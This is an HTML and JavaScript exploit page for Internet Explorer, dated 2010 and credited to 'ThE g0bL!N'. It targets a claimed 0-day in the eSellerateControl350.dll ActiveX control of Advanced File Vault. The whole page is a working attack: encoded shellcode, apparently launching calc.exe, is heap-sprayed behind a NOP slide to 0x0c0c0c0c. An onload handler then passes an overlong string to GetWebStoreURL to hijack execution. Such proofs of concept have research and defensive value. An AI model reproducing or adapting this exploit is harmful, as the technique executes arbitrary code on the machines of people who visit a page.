//# Exploit Title: Advanced File Vault(eSellerateControl350.dll) Activex Heap Spray  0-day
//# Date: 08-08-2010
//# Author: ThE g0bL!N
//# Version: 0-day
//# Tested on: xp sp2
<html>
 <script language="JavaScript" defer>
  var sCode = unescape("%uE860%u0000%u0000%u815D%u06ED%u0000%u8A00%u1285%u0001%u0800" +
                       "%u75C0%uFE0F%u1285%u0001%uE800%u001A%u0000%uC009%u1074%u0A6A" +
                       "%u858D%u0114%u0000%uFF50%u0695%u0001%u6100%uC031%uC489%uC350" +
                       "%u8D60%u02BD%u0001%u3100%uB0C0%u6430%u008B%u408B%u8B0C%u1C40" +
                       "%u008B%u408B%uFC08%uC689%u3F83%u7400%uFF0F%u5637%u33E8%u0000" +
                       "%u0900%u74C0%uAB2B%uECEB%uC783%u8304%u003F%u1774%uF889%u5040" +
                       "%u95FF%u0102%u0000%uC009%u1274%uC689%uB60F%u0107%uEBC7%u31CD" +
                       "%u40C0%u4489%u1C24%uC361%uC031%uF6EB%u8B60%u2444%u0324%u3C40" +
                       "%u408D%u8D18%u6040%u388B%uFF09%u5274%u7C03%u2424%u4F8B%u8B18" +
                       "%u205F%u5C03%u2424%u49FC%u407C%u348B%u038B%u2474%u3124%u99C0" +
                       "%u08AC%u74C0%uC107%u07C2%uC201%uF4EB%u543B%u2824%uE175%u578B" +
                       "%u0324%u2454%u0F24%u04B7%uC14A%u02E0%u578B%u031C%u2454%u8B24" +
                       "%u1004%u4403%u2424%u4489%u1C24%uC261%u0008%uC031%uF4EB%uFFC9" +
                       "%u10DF%u9231%uE8BF%u0000%u0000%u0000%u0000%u9000%u6163%u636C" +
                       "%u652E%u6578%u9000");
  var nops = unescape("%u9090%u9090");
  var address = 0x0c0c0c0c;
  function tryMe()
   {
    var buff = 3000;
    var x =  unescape("%0c%0c%0c%0c");
    while (x.length<buff) x += x;
    x = x.substring(0,buff);
    boom.GetWebStoreURL(x, 1);
  }
  function getsSlide(nops, nopsSize)
   {
    while (nops.length*2<nopsSize)
     {
      nops += nops;
     }
    nops = nops.substring(0,nopsSize/2);
    return (nops);
  }
  var Block = 0x400000;
  var header = 0x26;
  var PLSize = (sCode.length * 2);
  var nopsSize = Block - (PLSize + header);
  var heapBlocks = (address+Block)/Block;
  var memory = new Array();
  nops = getsSlide(nops,nopsSize);
  for (i=0;i<heapBlocks;i++)
   {
    memory[i] = nops +  sCode;
   }
 </script>
 <body onload="JavaScript: return tryMe();">
  <object id="boom" classid="clsid:25982EAA-87CC-4747-BE09-9913CF7DD2F1">
   By ThE g0bL!N
   Advanced File Vault(eSellerateControl350.dll) Activex Heap Spray  0-day
   Greets: His0k4 - Monster-Dz - B!b!-Info - MadjiX - LoGin.Dz - H4kr3m
  </object>
 </body>
</html>